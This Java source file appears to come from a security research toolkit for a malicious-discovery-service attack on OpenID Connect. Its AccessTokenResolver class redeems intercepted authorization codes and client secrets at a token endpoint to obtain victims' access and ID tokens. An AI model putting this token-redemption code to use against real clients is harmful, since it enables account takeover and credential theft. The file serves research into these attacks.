package de.rub.nds.oidc.attacks.oidc_maliciousdiscoveryservice.utils;

import com.nimbusds.jwt.JWT;
import com.nimbusds.oauth2.sdk.AuthorizationCode;
import com.nimbusds.oauth2.sdk.AuthorizationCodeGrant;
import com.nimbusds.oauth2.sdk.AuthorizationGrant;
import com.nimbusds.oauth2.sdk.ParseException;
import com.nimbusds.oauth2.sdk.SerializeException;
import com.nimbusds.oauth2.sdk.TokenRequest;
import com.nimbusds.oauth2.sdk.auth.ClientAuthentication;
import com.nimbusds.oauth2.sdk.auth.ClientSecretBasic;
import com.nimbusds.oauth2.sdk.auth.Secret;
import com.nimbusds.oauth2.sdk.http.HTTPRequest;
import com.nimbusds.oauth2.sdk.http.HTTPResponse;
import com.nimbusds.oauth2.sdk.id.ClientID;
import com.nimbusds.oauth2.sdk.token.AccessToken;
import com.nimbusds.openid.connect.sdk.OIDCAccessTokenResponse;
import de.rub.nds.oidc.attacks.oidc_maliciousdiscoveryservice.exceptions.AccessTokenResolverException;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;

/**
 *
 * @author Vladislav Mladenov<vladislav.mladenov@rub.de>
 */

public class AccessTokenResolver {
    
    public static InterceptedData resolve(HTTPRequest request) {
        InterceptedData data = new InterceptedData(request.getAuthorization());
        data.setHttpParameters(request.getQueryParameters());
        
        return data;
    }

    public static InterceptedData resolve(String tokenEndpoint, InterceptedData data) throws AccessTokenResolverException {
        try {
            AuthorizationGrant codeGrant = buildCodeGrant(data);
            
            ClientAuthentication clientAuth = buildClientAuth(data);
            
            URI tokenEndpointURL = new URI(tokenEndpoint);
            
            HTTPResponse tokenResponse = sendCodeGrant(tokenEndpointURL, clientAuth, codeGrant);
            
            parseResponse(tokenResponse, data);
            
            return data;
        } catch (URISyntaxException | SerializeException | IOException | ParseException | NullPointerException ex) {
            throw new AccessTokenResolverException("Cannot redeem Code:" + ex.toString());
        }
    }

    private static void parseResponse(HTTPResponse tokenResponse, InterceptedData data) throws AccessTokenResolverException, ParseException {
        OIDCAccessTokenResponse oidcToken = OIDCAccessTokenResponse.parse(tokenResponse);
        if (!oidcToken.indicatesSuccess()) {
            throw new AccessTokenResolverException ("Received unseccsufull Response from IdP: " + oidcToken.toString());
        }
        
        // Get the access token
        AccessToken accessToken = oidcToken.getAccessToken();
        JWT idToken = oidcToken.getIDToken();
        
        data.setId_token(idToken.getParsedString());
        data.setAccess_token(accessToken.getValue());
    }

    private static HTTPResponse sendCodeGrant(URI tokenEndpointURL, ClientAuthentication clientAuth, AuthorizationGrant codeGrant) throws IOException, SerializeException {
        // Make the token request
        TokenRequest request = new TokenRequest(tokenEndpointURL, clientAuth, codeGrant);
        HTTPResponse tokenResponse = request.toHTTPRequest().send();
        return tokenResponse;
    }

    private static ClientAuthentication buildClientAuth(InterceptedData data) {
        // The credentials to authenticate the client at the token endpoint
        ClientID clientID = new ClientID(data.getClient_id());
        Secret clientSecret = new Secret(data.getClient_secret());
        ClientAuthentication clientAuth = new ClientSecretBasic(clientID, clientSecret);
        return clientAuth;
    }

    private static AuthorizationGrant buildCodeGrant(InterceptedData data) throws URISyntaxException {
        // Construct the code grant from the code obtained from the authz endpoint
        // and the original callback URI used at the authz endpoint
        AuthorizationCode code = new AuthorizationCode(data.getCode());
        URI callback = new URI(data.getRedirect_uri());
        AuthorizationGrant codeGrant = new AuthorizationCodeGrant(code, callback);
        return codeGrant;
    }
}
